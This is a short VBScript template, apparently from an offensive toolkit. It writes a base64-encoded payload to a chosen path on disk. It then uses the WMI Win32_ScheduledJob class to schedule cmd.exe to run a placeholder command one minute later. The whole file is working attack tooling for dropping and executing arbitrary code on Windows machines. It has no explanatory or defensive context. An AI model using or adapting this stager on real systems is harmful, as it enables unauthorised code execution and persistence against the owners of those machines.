Dim time_zone
Dim exec_time

outputFile="REPLACE_WITH_DEST"
Const data="REPLACE_WITH_DATA"

B64toBinary data, outputFile
AddJobWithRes

Function GetTime()
    wbemCimtypeString = 8
    Set objSWbemService = GetObject("Winmgmts:root\cimv2")
    Set colItems = objSWbemService.ExecQuery("SELECT * FROM Win32_TimeZone", "WQL", wbemFlagReturnImmediately + wbemFlagForwardOnly )
    For Each objItem In colItems
        time_zone = objItem.Bias
		if time_zone > 0 Then
			time_zone = "+" & time_zone
		End IF
    Next
	
	' Delay one minute
	Dim tmp_time
	tmp_time = DateAdd("n",1,Now())
	exec_time = hour(tmp_time)*100 + minute(tmp_time)
End Function

Function AddJobWithRes()
	GetTime()
	Set objSWbemService = GetObject("Winmgmts:root\cimv2")
    exec_time = "********"&exec_time&"00.000000"&time_zone
	command = "c:\windows\system32\cmd.exe /c REPLACE_WITH_COMMAND"
    Set objNewJob = objSWbemService.Get("Win32_ScheduledJob")
    errJobCreated = objNewJob.Create(command, exec_time, True , , , True, JobId)
End Function

Function B64toBinary(data, outputFile)
	Set oXML = CreateObject("Msxml2.DOMDocument")
	Set oNode = oXML.CreateElement("base64")
	oNode.dataType = "bin.base64"
	oNode.text = data
	' oNode.text = contents

	Set BinaryStream = CreateObject("ADODB.Stream")
	BinaryStream.Type = 1 'adTypeBinary
	BinaryStream.Open
	BinaryStream.Write oNode.nodeTypedValue
	BinaryStream.SaveToFile outputFile
End Function